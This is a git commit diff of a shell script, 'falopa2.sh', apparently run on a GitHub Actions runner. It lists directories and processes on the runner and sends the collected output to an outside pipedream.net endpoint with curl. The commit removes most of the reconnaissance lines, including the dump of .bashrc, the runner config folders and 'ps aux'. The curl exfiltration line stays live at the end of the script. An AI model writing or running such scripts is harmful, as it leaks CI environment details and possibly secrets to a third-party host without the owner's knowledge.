857296a5981ff60169d7f35dea1f9403362b2f39
_m <matiasesena@gmail.com>
2021-11-05 19:54:31 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -4,61 +4,9 @@ echo "--- START ---" > /tmp/file.txt
 
 echo "--- /bin" >> /tmp/file.txt
 ls -1la /bin/ >> /tmp/file.txt
-echo "--- /usr/bin" >> /tmp/file.txt
-ls -1la /usr/bin/ >> /tmp/file.txt
+#echo "--- /usr/bin" >> /tmp/file.txt
+#ls -1la /usr/bin/ >> /tmp/file.txt
 
-echo "--- LS ---" >> /tmp/file.txt
-
-echo "--- /home" >> /tmp/file.txt
-ls -1la /home >> /tmp/file.txt
-echo "--- /home/runner" >> /tmp/file.txt
-ls -1la /home/runner >> /tmp/file.txt
-echo "--- /home/runner/.composer" >> /tmp/file.txt
-ls -1la /home/runner/.composer >> /tmp/file.txt
-
-echo $(cat /home/runner/.bashrc) >> /tmp/file.txt
-
-echo "--- /home/runner/.config" >> /tmp/file.txt
-ls -1la /home/runner/.config >> /tmp/file.txt
-echo "--- /home/runner/.config/GitHub\ActionsService" >> /tmp/file.txt
-ls -1la /home/runner/.config/GitHub\ActionsService >> /tmp/file.txt
-echo "--- /home/runner/.config/configstore" >> /tmp/file.txt
-ls -1la /home/runner/.config/configstore >> /tmp/file.txt
-
-echo "--- /home/runner/runners" >> /tmp/file.txt
-ls -1la /home/runner/runners >> /tmp/file.txt
-echo "--- /home/runner/runners/2.283.3" >> /tmp/file.txt
-ls -1la /home/runner/runners/2.283.3 >> /tmp/file.txt
-echo "--- /home/runner/runners/2.283.3/externals" >> /tmp/file.txt
-ls -1la /home/runner/runners/2.283.3/externals >> /tmp/file.txt
-
-echo "--- /home/runner/warmup " >> /tmp/file.txt
-ls -1la /home/runner/warmup >> /tmp/file.txt
-
-echo "--- home/runner/work" >> /tmp/file.txt
-ls -1la /home/runner/work >> /tmp/file.txt
-
-echo "--- home/runner/work/comment-ops-private-matiasesena" >> /tmp/file.txt
-ls -1la /home/runner/work/comment-ops-private-matiasesena >> /tmp/file.txt
-echo "--- home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena" >> /tmp/file.txt
-ls -1la /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena >> /tmp/file.txt
-echo "--- home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/tools" >> /tmp/file.txt
-ls -1la /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/tools >> /tmp/file.txt
-
-echo "--- home/runner/work/_temp" >> /tmp/file.txt
-ls -1la /home/runner/work/_temp >> /tmp/file.txt
-
-echo "--- home/runner/work/_temp/_github_workflow" >> /tmp/file.txt
-ls -1la /home/runner/work/_temp/_github_workflow >> /tmp/file.txt
-echo "--- home/runner/work/_temp/_runner_file_commands" >> /tmp/file.txt
-ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt
-
-ls -1la ~/ >> /tmp/file.txt
-ls -1la ./tools >> /tmp/file.txt
-
-ps aux | while IFS= read -r line; do
-    printf '%s\n' "$line" >> /tmp/file.txt
-done 
 echo "--- FINISH ---" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/
